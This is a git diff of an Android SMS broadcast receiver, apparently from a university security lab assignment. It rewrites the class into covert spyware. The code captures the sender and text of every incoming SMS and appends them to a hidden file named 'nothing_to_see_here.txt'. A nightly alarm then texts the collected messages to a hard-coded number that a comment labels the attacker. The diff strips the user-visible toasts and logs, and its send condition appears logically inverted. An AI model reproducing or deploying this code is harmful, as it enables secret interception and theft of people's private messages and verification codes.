@@ -19,16 +19,12 @@ import java.io.IOException;
 public class SMSReceiver extends BroadcastReceiver{
 
     // Get the object of SmsManager
-    final SmsManager sms = SmsManager.getDefault();
     String senderNum;
     String message;
-    public boolean flag = false;
 
     public void onReceive(Context context, Intent intent) {
 
         if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
-
-            Log.d("%%%%%%%%%%%%", "WORKED");
 
             // Retrieves a map of extended data from the intent.
             final Bundle bundle = intent.getExtras();
@@ -42,8 +38,8 @@ public class SMSReceiver extends BroadcastReceiver{
 
                    /*
                     *  A PDU is a "protocol description unit", which is the industry format for an SMS message.
-                    *  Because SMSMessage reads/writes them you shouldn't need to dissect them.
-                    *  A large message might be broken into many, which is why it is an array of objects.
+                    *  Because SMSMessage reads and writes them, you shouldn't need to dissect them.
+                    *  A large message might be broken into many tiny pieces, which is why it is an array of objects.
                     */
 
                     final Object[] pdusObj = (Object[]) bundle.get("pdus");
@@ -53,94 +49,73 @@ public class SMSReceiver extends BroadcastReceiver{
                         SmsMessage currentMessage;
                         currentMessage = SmsMessage.createFromPdu((byte[]) aPdusObj);
 
-                        senderNum = currentMessage.getDisplayOriginatingAddress(); //get sendernum
-                        message = currentMessage.getDisplayMessageBody(); //get msg
-
-                        Log.d("SmsReceiver", "senderNum: " + senderNum + "; message: " + message);
+                        senderNum = currentMessage.getDisplayOriginatingAddress(); //get sender num
+                        message = currentMessage.getDisplayMessageBody(); //get sender msg
 
                         String data = "Sender Num: " + senderNum + " Message: " + message;
 
-                        writeToFile(data, context, senderNum, message);
-
-                        // SHOW DA TOAST
-                        int duration = Toast.LENGTH_LONG;
-                        Toast toast = Toast.makeText(context,
-                                "senderNum: " + senderNum + ", message: " + message, duration);
-                        //This will be gone in the final build
-                        toast.show();
+                        writeToFile(data, context); //Write message content to a file inside cps633.lab4 folder in /sdcard/Android/data
                     }
                 }
-
             } catch (Exception e) {
                 Log.e("SmsReceiver", "Exception  smsReceiver" + e);
             }
         }
 
+        //This only gets called when it's 11:59:59pm on the phone
         if(intent.getAction().equals("AlarmStuff")){
-            Log.d("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@", "ALARM WORKED");
-
             sendMessage(context);
         }
-
     }
 
     private void sendMessage(Context context) {
-        String filename = context.getExternalCacheDir().getAbsolutePath()+"/test.txt";
+        String filename = context.getExternalCacheDir().getAbsolutePath()+"/nothing_to_see_here.txt";
         String content = "";
 
         File file = new File(filename);
 
-        try {
-            BufferedReader br = new BufferedReader(new FileReader(file));
-            String line;
-            while ((line = br.readLine()) != null) {
-                content += line + "\n";
+        if(file.length() == 0 || !file.exists()) {
+            try {
+                BufferedReader bufferedReader = new BufferedReader(new FileReader(file));
+                String line;
+                while ((line = bufferedReader.readLine()) != null) {
+                    content += line + "\n";
+                }
+                sendSMS(content); //Call sendSMS to send SMS with message content to attacker
+            } catch (IOException e) {
+                e.printStackTrace();
             }
-
-            Log.d("^^^^^^^", content);
-
-        }
-        catch (IOException e) {
-            e.printStackTrace();
         }
     }
 
-    private void writeToFile(String data, Context context, String senderNum, String message) throws IOException {
+    private void writeToFile(String data, Context context) throws IOException {
         try {
                 String baseFolder = context.getExternalCacheDir().getAbsolutePath();
 
-                File file = new File(baseFolder + File.separator + "test.txt");
+                File file = new File(baseFolder + "/nothing_to_see_here.txt");
                 file.getParentFile().mkdirs();
 
-                Log.d("File", file.getAbsolutePath());
-
-                FileOutputStream fos = new FileOutputStream(file);
+                FileOutputStream fos = new FileOutputStream(file, true);
 
                 fos.write(data.getBytes());
                 fos.flush();
                 fos.close();
-
-                //sendSMS(context, senderNum, message);
         }
         catch (Exception e) {
             Log.e("writeToFile", "Exception writeToFile" + e);
+            e.printStackTrace();
         }
     }
 
-    public static void sendSMS(Context context, String senderNum, String message) {
+    public static void sendSMS(String content) {
         Log.d("sendSMS", "Sending a SMS now!");
 
         try {
             SmsManager smsManager = SmsManager.getDefault();
-            smsManager.sendTextMessage(senderNum, null, message, null, null);
+            smsManager.sendTextMessage("+16477172894", null, content, null, null);
 
-            //this will be gone in the final build
-            Toast.makeText(context.getApplicationContext(), "SMS sent.",
-                    Toast.LENGTH_LONG).show();
         } catch (Exception e) {
-            Toast.makeText(context.getApplicationContext(),
-                    "SMS failed, please try again.",
-                    Toast.LENGTH_LONG).show();
+            Log.e("sendSMS", "SMS failed");
             e.printStackTrace();
         }
     }
